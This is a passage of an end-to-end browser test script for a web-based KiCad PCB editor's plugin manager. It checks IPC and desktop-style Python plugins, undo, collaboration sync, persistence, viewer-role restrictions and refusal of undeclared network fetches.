const direct = await a.evaluate(async (id) => { const r = await fetch(`/api/plugins/pcm/${id}/fetch`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ url: 'https://example.org/', method: 'GET' }) }); return r.status; }, ID);
const custom = await a.evaluate(async () => { const r = await fetch('/api/plugins/pcm/com.example.not-in-the-repository/fetch', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ url: 'http://127.0.0.1:8096/echo', method: 'GET' }) }); return r.status; });
check('the server refuses other addresses and plugins that are not in KiCad\'s repository, whoever asks', direct === 403 && custom === 404, `${direct} ${custom}`);
await idle(a, ID);

// ---- a plugin for KiCad's IPC interface (kipy)
await menu(a, 'tools', 'External Plugins', 'pluginManager');
await a.click('#pluginManager [data-tab="catalog"]');
await a.waitForSelector(`#pluginCatalog [data-install="${IPC_ID}"]`);
await a.click(`#pluginCatalog [data-install="${IPC_ID}"]`);
await a.waitForSelector('#pluginConsent', { timeout: 30000 });
check('a plugin without web addresses is not offered network access', (await a.locator('#pluginConsent [data-perm="network"]').count()) === 0);
await a.click('#pluginConsentOk');
await a.waitForFunction((i) => window.KcPlugins.store.get().installed.some((p) => p.identifier === i), IPC_ID, { timeout: 30000 });
await a.click('#pluginManager .kd-x').catch(() => {});
await ready(a, IPC_ID, 120000);
const ipcActs = ((await state(a)).py[IPC_ID] || []);
check('the actions of its plugin.json become editor commands', ipcActs.map((x) => x.name).join() === 'IPC: add via,IPC: place label', JSON.stringify(ipcActs) + ((await state(a)).logs[IPC_ID] || []).slice(-4).map((l) => l.text).join(' | '));
const viasBefore = await count(a, 'via'), segsBefore = await count(a, 'segment'), ipcDepth = await undoDepth(a);
await a.evaluate(([i, x]) => { window.KcPlugins.runUi(`plugin:${i}:${x}`); }, [IPC_ID, ipcActs[0] ? ipcActs[0].identifier : '']);
await waitLog(a, IPC_ID, /IPCTOOL /, 90000);
const ipcLine = (await logOf(a, IPC_ID)).find((l) => l.includes('IPCTOOL ')) || '';
check('kipy talks to the open board', /version=10\.\d+\.\d+.* board=ecc83-pp\.kicad_pcb footprints=\d+ made=Via,Track copper=2 stackup=\d+/.test(ipcLine), ipcLine);
await a.waitForFunction((n) => Array.from(window.CollabEditor.kdoc.items.values()).filter((it) => it.kind === 'via').length === n + 1, viasBefore, { timeout: 20000 }).catch(() => {});
check('create_items inside a commit is one edit: a via and a track', (await count(a, 'via')) === viasBefore + 1 && (await count(a, 'segment')) === segsBefore + 1 && (await undoDepth(a)) === ipcDepth + 1, `${await count(a, 'via')} ${await count(a, 'segment')} ${await undoDepth(a)} vs ${viasBefore} ${segsBefore} ${ipcDepth}`);
await b.waitForFunction((n) => Array.from(window.CollabEditor.kdoc.items.values()).filter((it) => it.kind === 'via').length === n + 1, viasBefore, { timeout: 20000 }).catch(() => {});
check('the second person sees it', (await count(b, 'via')) === viasBefore + 1 && (await count(b, 'segment')) === segsBefore + 1);
await idle(a, IPC_ID);
await a.keyboard.press('Control+z');
await a.waitForFunction((n) => Array.from(window.CollabEditor.kdoc.items.values()).filter((it) => it.kind === 'via').length === n, viasBefore, { timeout: 20000 }).catch(() => {});
check('and one Undo takes both away', (await count(a, 'via')) === viasBefore && (await count(a, 'segment')) === segsBefore);
// a footprint made through the interface, then handed to the cursor (KiCad's interactive move)
const ipcFps = await count(a, 'footprint');
await a.mouse.move(700, 400);
await a.evaluate(([i, x]) => { window.KcPlugins.runUi(`plugin:${i}:${x}`); }, [IPC_ID, ipcActs[1] ? ipcActs[1].identifier : '']);
await waitLog(a, IPC_ID, /IPCLABEL /, 90000).catch(() => {});
const labelLine = (await logOf(a, IPC_ID)).find((l) => l.includes('IPCLABEL ')) || (await logOf(a, IPC_ID)).slice(-4).join(' | ');
const labelId = (/id=([0-9a-f-]{36})/.exec(labelLine) || [])[1] || '';
const label = await a.evaluate((id) => { const it = window.CollabEditor.kdoc.items.get(id); const txt = it ? window.CollabEditor.kdoc.textOf ? window.CollabEditor.kdoc.textOf(it) : JSON.stringify(it.node || '') : ''; return { there: !!it, kind: it && it.kind, text: String(txt).slice(0, 4000), sel: window.CollabEditor.hooks.selectedIds(), busy: window.CollabEditor.hooks.busy() }; }, labelId);
check('a footprint made through kipy lands on the board', /made=FootprintInstance/.test(labelLine) && label.there && label.kind === 'footprint' && (await count(a, 'footprint')) === ipcFps + 1, labelLine + ' ' + JSON.stringify({ there: label.there, kind: label.kind }));
check('interactive_move hands it to the cursor, selected', label.busy === true && label.sel.includes(labelId), JSON.stringify({ busy: label.busy, sel: label.sel }));
await a.keyboard.press('Escape');
await idle(a, IPC_ID);
await a.keyboard.press('Control+z');
await a.waitForFunction((n) => Array.from(window.CollabEditor.kdoc.items.values()).filter((it) => it.kind === 'footprint').length === n, ipcFps, { timeout: 20000 }).catch(() => {});
check('and one Undo takes the footprint away', (await count(a, 'footprint')) === ipcFps, `${await count(a, 'footprint')} vs ${ipcFps}`);
await a.evaluate(() => { window.confirm = () => true; });
await menu(a, 'tools', 'External Plugins', 'pluginManager');
await a.waitForSelector('#pluginDetail');
const ipcDetail = await a.locator('#pluginDetail').innerText();
await a.click('#pluginUninstall');
await a.waitForFunction((i) => !window.KcPlugins.store.get().installed.some((p) => p.identifier === i), IPC_ID, { timeout: 20000 }).catch(() => {});
check('the manager shows it with its command, and uninstalling it leaves the other plugin running', /IPC Tool/.test(ipcDetail) && /IPC: add via/.test(ipcDetail) && !(await state(a)).installed.includes(IPC_ID) && (await state(a)).installed.includes(ID), ipcDetail.slice(0, 300));
await a.click('#pluginManager .kd-x').catch(() => {});

// ---- a plugin that leans on the desktop: kicad-cli, git, a Qt window, a footprint wizard
await menu(a, 'tools', 'External Plugins', 'pluginManager');
await a.click('#pluginManager [data-tab="catalog"]');
await a.waitForSelector(`#pluginCatalog [data-install="${DESK_ID}"]`);
await a.click(`#pluginCatalog [data-install="${DESK_ID}"]`);
await a.waitForSelector('#pluginConsent', { timeout: 30000 });
await a.click('#pluginConsentOk');
await a.waitForFunction((i) => window.KcPlugins.store.get().installed.some((p) => p.identifier === i), DESK_ID, { timeout: 30000 });
await a.click('#pluginManager .kd-x').catch(() => {});
await ready(a, DESK_ID, 120000);
const deskActs = ((await state(a)).py[DESK_ID] || []);
const deskRun = (name) => a.evaluate(([i, x]) => { window.KcPlugins.runUi(`plugin:${i}:${x}`); }, [DESK_ID, (deskActs.find((x) => x.name === name) || {}).identifier || '']);
const deskLine = async (tag) => { await waitLog(a, DESK_ID, new RegExp('DESKTOOL ' + tag + ' '), 90000).catch(() => {}); const l = (await logOf(a, DESK_ID)).find((x) => x.includes('DESKTOOL ' + tag + ' ')) || ''; try { return JSON.parse(l.slice(l.indexOf('DESKTOOL ' + tag + ' ') + 10 + tag.length)); } catch { return { failed: l || (await logOf(a, DESK_ID)).slice(-4).join(' | ') }; } };
check('a footprint wizard is offered as a command beside the plugin\'s actions', deskActs.map((x) => x.name).join() === 'Desk: programs,Desk: commit,Desk: Qt window,Desk: nudge,Desk: helper,Desk: editor,Desk: tree,Footprint Wizard: Test ring', JSON.stringify(deskActs.map((x) => x.name)));
await deskRun('Desk: programs');
const prog = await deskLine('programs');
check('kicad-cli is found and reports a version', prog.cli === true && /^\d+\.\d+/.test(prog.version || ''), JSON.stringify(prog).slice(0, 300));
check('kicad-cli pcb export gerbers writes the editor\'s Gerbers where the plugin asked', prog.gerbers && prog.gerbers[0] === 0 && prog.gerbers[1].length === 2 && /^(G04 |%TF\.)$/.test(prog.gerber_head), JSON.stringify(prog.gerbers) + prog.gerber_head);
check('kicad-cli pcb export svg draws each layer', prog.svg && prog.svg[0] === 0 && prog.svg[1].length === 2 && prog.svg[2] && prog.svg[3], JSON.stringify(prog.svg));
check('kicad-cli pcb drc writes KiCad\'s JSON report from the editor\'s checker', prog.drc && prog.drc[0] === 0 && ['schematic_parity', 'unconnected_items', 'violations'].every((k) => prog.drc[1].includes(k)) && prog.drc[2], JSON.stringify(prog.drc));
check('kicad-cli sch export bom and netlist read the project\'s schematic', prog.bom && prog.bom[0] === 0 && prog.bom[1] === '"Refs","Value","Footprint"' && prog.bom[2] && prog.netlist && prog.netlist.every((v, i) => (i ? v === true : v === 0)), JSON.stringify([prog.bom, prog.netlist]));
check('a kicad-cli command the web has no form for fails with an exit code, as kicad-cli does, not faked', prog.render === 'CalledProcessError', String(prog.render));
check('git answers for the project folder', prog.git && prog.git[0] === 0 && prog.git[1] && prog.git[2], JSON.stringify(prog.git));
await idle(a, DESK_ID);
const versionsBefore = (await db.query('SELECT count(*)::int AS n FROM versions WHERE project_id = $1 AND name = $2', [projectId, 'Plugin checkpoint']).catch(() => ({ rows: [{ n: -1 }] }))).rows[0].n;
await deskRun('Desk: commit');
const commit = await deskLine('commit');
await a.waitForTimeout(1500);
const versionsAfter = (await db.query('SELECT count(*)::int AS n FROM versions WHERE project_id = $1 AND name = $2', [projectId, 'Plugin checkpoint']).catch(() => ({ rows: [{ n: -1 }] }))).rows[0].n;
check('git commit saves a version of the project', Array.isArray(commit) && commit[0] === 0 && versionsAfter === versionsBefore + 1, `${JSON.stringify(commit)} versions ${versionsBefore} → ${versionsAfter}`);
await idle(a, DESK_ID);
await deskRun('Desk: Qt window');
await a.waitForSelector('#pluginWindow', { timeout: 30000 });
const qt = a.frameLocator(`iframe[data-plugin="${DESK_ID}"]`);
await qt.getByText('Count', { exact: true }).click();
await qt.getByText('Pads on R2: 2').waitFor({ timeout: 10000 }).catch(() => {});
check('a Qt window opens as a KiCad dialog and its signals reach the plugin', (await a.locator('#pluginWindow .kd-title').innerText()).includes('Qt in the web editor') && (await qt.getByText('Pads on R2: 2').count()) === 1);
await shot(a, 'py-07-qt');
await qt.getByText('Done', { exact: true }).click();
const qtOut = await deskLine('qt');
check('QDialog.exec returns when the dialog is accepted', Array.isArray(qtOut) && qtOut[0] === 1 && qtOut[1] === 'Pads on R2: 2', JSON.stringify(qtOut));
await idle(a, DESK_ID);

// ---- a plugin with a helper: a local port, a second program, an answer given on the window system's thread
await deskRun('Desk: helper');
const helper = await deskLine('helper');
let helperSaid = {}; try { helperSaid = JSON.parse(helper[1]); } catch { /* reported below */ }
check('a plugin that listens on a local port is reached by the second program it starts', Array.isArray(helper) && helper[0] === 0 && helperSaid.ok === true && helperSaid.pads === 2, JSON.stringify(helper));
check('a port nothing listens on refuses the connection', Array.isArray(helper) && helper[2] === 'ConnectionRefusedError', JSON.stringify(helper));
await idle(a, DESK_ID);

// ---- a plugin that works KiCad's own window: its plugin menu, Undo, a hotkey on the canvas, the Appearance panel
const edDepth = await undoDepth(a);
await deskRun('Desk: editor');
const edOut = await deskLine('editor');
check('a plugin finds its own entry in Tools → External Plugins, chooses it, and Edit → Undo takes it back', edOut.menu && edOut.menu.every(Boolean) && (await undoDepth(a)) === edDepth, `${JSON.stringify(edOut.menu)} undo ${edDepth} → ${await undoDepth(a)}`);
const lit = await a.evaluate(() => (window.CollabEditor && window.CollabEditor.highlightIds ? window.CollabEditor.highlightIds.size : 0));
check('KiCad\'s highlight-net hotkey sent to the canvas highlights the selected net in the editor', edOut.highlight && edOut.highlight.slice(0, 3).every(Boolean) && lit > 0, `${JSON.stringify(edOut.highlight)} lit ${lit}`);
const netRow = await a.evaluate((name) => { const ap = window.CollabPanels.getState().appearance; const n = ap.nets.find((x) => x.name === name); return n ? [n.color, n.visible, ap.netColorMode] : null; }, edOut.highlight ? edOut.highlight[3] : '');
check('the Appearance panel\'s net grid is the editor\'s: a colour, a hidden ratsnest and the colour mode set by the plugin show there', edOut.appearance && edOut.appearance.every(Boolean) && netRow && /^#ff8800$/i.test(netRow[0] || '') && netRow[1] === false && netRow[2] === 'all', `${JSON.stringify(edOut.appearance)} ${JSON.stringify(netRow)}`);
await idle(a, DESK_ID);

// ---- a tree with columns, an accelerator key and the colour chooser
await deskRun('Desk: tree');
await a.waitForSelector('#pluginWindow', { timeout: 30000 });
const tr = a.frameLocator(`iframe[data-plugin="${DESK_ID}"]`);
const groupRows = await tr.locator('.wx-tree tr:has(td)').count();
await tr.locator('.wx-tree .wx-tree-exp').first().click();
await tr.locator('.wx-tree tr:has(td)').nth(groupRows).waitFor({ timeout: 10000 }).catch(() => {});
const openRows = await tr.locator('.wx-tree tr:has(td)').count();
check('a tree with columns shows its groups and opens one', groupRows > 1 && openRows > groupRows && (await tr.locator('.wx-tree th').count()) === 2, `${groupRows} → ${openRows}`);
await tr.locator('.wx-tree tr:has(td)').nth(1).locator('td').nth(1).click();
await tr.getByText(/^Chosen: [A-Z]+\d+$/).waitFor({ timeout: 10000 }).catch(() => {});
check('choosing a row tells the plugin which item it is', (await tr.getByText(/^Chosen: [A-Z]+\d+$/).count()) === 1, await tr.locator('.wx-text').allInnerTexts().then((t) => t.join('|')).catch(() => ''));
await shot(a, 'py-08-tree');
await tr.getByText('Colour', { exact: true }).focus();
await a.keyboard.press('F5');
await tr.getByText('Refreshed 1').waitFor({ timeout: 10000 }).catch(() => {});
check('an accelerator key runs its menu command', (await tr.getByText('Refreshed 1').count()) === 1);
await tr.getByText('Colour', { exact: true }).click();
await tr.locator('input[type="text"]:visible').last().fill('#12AB34');
await tr.locator('button:visible', { hasText: /^OK$/ }).last().click();
await tr.getByText('Colour #12AB34').waitFor({ timeout: 10000 }).catch(() => {});
check('the colour chooser returns the colour typed', (await tr.getByText('Colour #12AB34').count()) === 1);
await tr.locator('button:visible', { hasText: /^Done$/ }).last().click();
const treeOut = await deskLine('tree');
check('the tree reports its items, the column clicked and the key', Array.isArray(treeOut) && treeOut[0] === true && treeOut[1] > 1 && treeOut[2] === treeOut[1] && treeOut[3] === true && treeOut[4][0] && treeOut[4][0][1] === 1 && treeOut[5] === 1 && treeOut[6][0] === '#12AB34', JSON.stringify(treeOut));
await idle(a, DESK_ID);
const fpsBefore = await count(a, 'footprint'), wizDepth = await undoDepth(a);
await deskRun('Footprint Wizard: Test ring');
await a.waitForSelector('#pluginWindow', { timeout: 30000 });
const wiz = a.frameLocator(`iframe[data-plugin="${DESK_ID}"]`);
await wiz.locator('svg circle').first().waitFor({ timeout: 10000 }).catch(() => {});
const padsDrawn = () => wiz.locator('svg g > circle').count();
const drawn8 = await padsDrawn();
await wiz.locator('input[type=text]:visible').first().fill('12');
await a.waitForTimeout(500);
check('the wizard dialog draws the footprint and redraws it when a value changes', drawn8 === 8 && (await padsDrawn()) === 12, `${drawn8} then ${await padsDrawn()}`);
await wiz.locator('input[type=text]:visible').first().fill('1');
await a.waitForTimeout(500);
check('a value outside the wizard\'s limits is reported and nothing can be placed', (await wiz.getByText('Place on Board').isDisabled()) && /below minimum/.test(await wiz.locator('textarea:visible').inputValue()), await wiz.locator('textarea:visible').inputValue());
await wiz.locator('input[type=text]:visible').first().fill('12');
await a.waitForTimeout(500);
await shot(a, 'py-08-wizard');
await wiz.getByText('Place on Board').click();
await a.waitForFunction((n) => Array.from(window.CollabEditor.kdoc.items.values()).filter((it) => it.kind === 'footprint').length === n + 1, fpsBefore, { timeout: 20000 }).catch(() => {});
const wizPlaced = await a.evaluate(() => { const it = Array.from(window.CollabEditor.kdoc.items.values()).filter((x) => x.kind === 'footprint').pop(); return it ? { pads: (it.pads || []).length, value: it.value } : null; });
check('Place on Board adds the built footprint to the board as one edit', (await count(a, 'footprint')) === fpsBefore + 1 && (await undoDepth(a)) === wizDepth + 1, `${fpsBefore} → ${await count(a, 'footprint')}, ${JSON.stringify(wizPlaced)}`);
await b.waitForFunction((n) => Array.from(window.CollabEditor.kdoc.items.values()).filter((it) => it.kind === 'footprint').length === n + 1, fpsBefore, { timeout: 20000 }).catch(() => {});
check('the second person sees the new footprint', (await count(b, 'footprint')) === fpsBefore + 1);
await idle(a, DESK_ID);
await a.keyboard.press('Control+z');
await a.waitForFunction((n) => Array.from(window.CollabEditor.kdoc.items.values()).filter((it) => it.kind === 'footprint').length === n, fpsBefore, { timeout: 20000 }).catch(() => {});
check('and Undo removes it', (await count(a, 'footprint')) === fpsBefore);
await a.evaluate(() => { window.confirm = () => true; });
await menu(a, 'tools', 'External Plugins', 'pluginManager');
await a.waitForSelector('#pluginDetail');
await a.click('#pluginUninstall');
await a.waitForFunction((i) => !window.KcPlugins.store.get().installed.some((p) => p.identifier === i), DESK_ID, { timeout: 20000 }).catch(() => {});
await a.click('#pluginManager .kd-x').catch(() => {});

// ---- the manager's view of it
await menu(a, 'tools', 'External Plugins', 'pluginManager');
await a.waitForSelector('#pluginDetail');
const detail = await a.locator('#pluginDetail').innerText();
check('the installed plugin lists its commands and its origin', /Command: Py: dialog/.test(detail) && (await a.locator('#pluginPython').count()) === 1 && (await a.locator('#pluginShare').count()) === 0, detail.slice(0, 300));
await shot(a, 'py-06-installed');
await a.click('#pluginManager [data-tab="catalog"]');
await a.waitForSelector(`#pluginCatalog [data-source="kicad"][data-plugin="${ID}"]`);
check('the repository shows it as installed', /Installed/.test(await a.locator(`#pluginCatalog [data-source="kicad"][data-plugin="${ID}"]`).innerText()));
await a.click('#pluginManager .kd-x');

// ---- next visit: nothing starts until a command is used
const kept = (page) => page.evaluate((id) => {
  const out = {};
  for (let i = 0; i < localStorage.length; i++) { const k = localStorage.key(i); if (k.startsWith('kc.plugin.') && k.endsWith('.' + id)) Object.assign(out, JSON.parse(localStorage.getItem(k) || '{}')); }
  return out;
}, ID);
const runsIn = (store) => {
  const read = (body) => (body ? Number(zlib.inflateSync(Buffer.from(body, 'base64')).toString()) : 0);
  const own = store['py.state'] || {}; const projectKey = Object.keys(store).find((k) => k.startsWith('py.project.'));
  return { home: read((own.home || {})['.config/pytool/runs']), project: read(projectKey ? (store[projectKey].files || {})['.pytool/runs'] : null), projectKey };
};
const runsBefore = runsIn(await kept(a));
check('the plugin\'s settings file and its hidden file beside the board are kept in its storage', runsBefore.home >= 1 && runsBefore.project === runsBefore.home && runsBefore.projectKey === 'py.project.' + projectId, JSON.stringify(runsBefore));
check('what a plugin puts on the clipboard lands in the editor\'s copy buffer', (await a.evaluate(() => window.CollabEditor.api.toolCtx().clipboard.get())) === '(text "from the plugin" (at 1 2 0))');
await a.evaluate(() => window.CollabEditor.api.toolCtx().clipboard.set('(wire (pts (xy 1 1) (xy 2 2)))'));   // Copy in the editor
await a.reload();
await editorReady(a);
await a.waitForTimeout(1500);
check('on the next visit no interpreter starts by itself', (await frames(a)) === 0 && !(await state(a)).running[ID]);
check('but its commands are in the menu and on the toolbar', ((await state(a)).py[ID] || []).length === 6 && (await a.locator(`.plg-tb-btn[data-uiact^="plugin:${ID}:"]`).count()) === 1);
const t1 = Date.now();
await a.click(`.plg-tb-btn[data-uiact="plugin:${ID}:${await act(a, 'Py: move R2')}"]`);
await a.waitForFunction((x) => { for (const it of window.CollabEditor.kdoc.items.values()) if (it.kind === 'footprint' && it.ref === 'R2') return Math.abs(it.x - x) > 1; return false; }, before.x, { timeout: 90000 });
check('the first click starts it and runs the command', (await frames(a)) === 1 && Math.abs((await fp(a, 'R2')).x - (before.x + 5)) < 1e-3);
console.log(`      (cold start to finished edit: ${Date.now() - t1} ms)`);
await idle(a, ID);
const runsAfter = runsIn(await kept(a));
{
  const store = await kept(a); const key = Object.keys(store).find((k) => k.startsWith('py.project.'));
  const body = key ? (store[key].files || {})['.pytool/copied'] : null;
  check('a plugin reads what Copy in the editor took, also after a reload', !!body && zlib.inflateSync(Buffer.from(body, 'base64')).toString() === '(wire (pts (xy 1 1) (xy 2 2)))', body ? zlib.inflateSync(Buffer.from(body, 'base64')).toString() : 'no file');
}
check('and on the next visit the plugin finds them again', runsAfter.home === runsBefore.home + 1 && runsAfter.project === runsBefore.project + 1, JSON.stringify([runsBefore, runsAfter]));

// ---- a viewer cannot change the board through a plugin
await db.query(`UPDATE permissions SET role = 'viewer' WHERE project_id = $1 AND user_id = $2`, [projectId, lee]);
await db.query(`INSERT INTO plugins (user_id, identifier, manifest, files, granted, enabled, source) SELECT $1, identifier, manifest, files, granted, true, source FROM plugins WHERE user_id = $2 AND identifier = $3`, [lee, dana, ID]);
await b.reload(); await editorReady(b);
const r2 = await fp(b, 'R2');
await b.evaluate(([i]) => { const s = window.KcPlugins.store.get(); const p = s.installed.find((x) => x.identifier === i); return p ? 1 : 0; }, [ID]);
await b.waitForFunction((i) => (window.KcPlugins.store.get().pyActions[i] || []).length === 6, ID, { timeout: 90000 });
await b.evaluate(([i, n]) => { const act = window.KcPlugins.store.get().pyActions[i].find((x) => x.name === n); window.KcPlugins.runUi(`plugin:${i}:${act.identifier}`); }, [ID, 'Py: move R2']);
await waitLog(b, ID, /view-only/, 60000).catch(() => {});
check('a viewer running the plugin changes nothing', JSON.stringify(await fp(b, 'R2')) === JSON.stringify(r2) && (await logOf(b, ID)).some((l) => /view-only/.test(l)), (await logOf(b, ID)).slice(-3).join(' | '));

// ---- uninstall
await a.evaluate(() => { window.confirm = () => true; });
await menu(a, 'tools', 'External Plugins', 'pluginManager');
await a.waitForSelector('#pluginDetail');
await a.click('#pluginUninstall');
await a.waitForFunction((i) => !window.KcPlugins.store.get().installed.some((p) => p.identifier === i), ID);
check('uninstalling stops the interpreter and removes its commands', (await frames(a)) === 0 && !(await state(a)).py[ID] && (await db.query('SELECT count(*)::int AS n FROM plugins WHERE user_id = $1', [dana])).rows[0].n === 0);
await a.click('#pluginManager .kd-x');

check('no page errors', errors.length === 0, errors.slice(0, 4).join(' | '));
await browser.close(); await db.end(); pcm.close();
console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
